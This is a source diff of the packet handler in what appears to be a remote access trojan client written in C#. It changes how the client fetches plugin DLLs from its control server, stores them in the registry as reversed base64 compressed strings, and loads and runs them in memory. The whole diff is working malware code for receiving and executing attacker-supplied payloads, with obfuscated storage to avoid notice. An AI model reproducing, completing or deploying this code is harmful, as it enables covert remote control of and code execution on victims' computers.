@@ -8,11 +8,13 @@ using System.Reflection;
 using System.Threading;
 using System.Collections.Generic;
 using Microsoft.VisualBasic;
+using System.Linq;
 
 namespace Client.Handle_Packet
 {
     public static class Packet
     {
+        public static List<MsgPack> Packs = new List<MsgPack>();
         public static void Read(object data)
         {
             try
@@ -33,11 +35,23 @@ namespace Client.Handle_Packet
 
                     case "plugin": // run plugin in memory
                         {
-                            Received();
-                            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)))));
-                            Type type = assembly.GetType("Plugin.Plugin");
-                            dynamic instance = Activator.CreateInstance(type);
-                            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
+                            try
+                            {
+                                Invoke(unpack_msgpack);
+                            }
+                            catch (Exception ex) // check if plugin is installed
+                            {
+                                if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null)
+                                {
+                                    Packs.Add(unpack_msgpack); //save it for later
+                                    MsgPack msgPack = new MsgPack();
+                                    msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
+                                    msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
+                                    ClientSocket.Send(msgPack.Encode2Bytes());
+                                }
+                                else
+                                    Error(ex.Message);
+                            }
                             break;
                         }
 
@@ -45,26 +59,13 @@ namespace Client.Handle_Packet
                         {
                             SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").AsString);
                             Debug.WriteLine("plugin saved");
-                            break;
-                        }
-
-                    case "checkPlugin": // server sent all plugins hashes, we check which plugin we miss
-                        {
-                            List<string> plugins = new List<string>();
-                            foreach (string plugin in unpack_msgpack.ForcePathObject("Hash").AsString.Split(','))
+                            foreach (MsgPack msgPack in Packs.ToList())
                             {
-                                if (SetRegistry.GetValue(plugin) == null)
+                                if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                                 {
-                                    plugins.Add(plugin);
-                                    Debug.WriteLine("plugin not found");
+                                    Invoke(msgPack);
+                                    Packs.Remove(msgPack);
                                 }
-                            }
-                            if (plugins.Count > 0)
-                            {
-                                MsgPack msgPack = new MsgPack();
-                                msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
-                                msgPack.ForcePathObject("Hashes").SetAsString(string.Join(",", plugins));
-                                ClientSocket.Send(msgPack.Encode2Bytes());
                             }
                             break;
                         }
@@ -74,6 +75,15 @@ namespace Client.Handle_Packet
             {
                 Error(ex.Message);
             }
+        }
+
+        private static void Invoke(MsgPack unpack_msgpack)
+        {
+            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)))));
+            Type type = assembly.GetType("Plugin.Plugin");
+            dynamic instance = Activator.CreateInstance(type);
+            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
+            Received();
         }
 
         private static void Received() //reset client forecolor
@@ -91,6 +101,5 @@ namespace Client.Handle_Packet
             msgpack.ForcePathObject("Error").AsString = ex;
             ClientSocket.Send(msgpack.Encode2Bytes());
         }
-
     }
 }
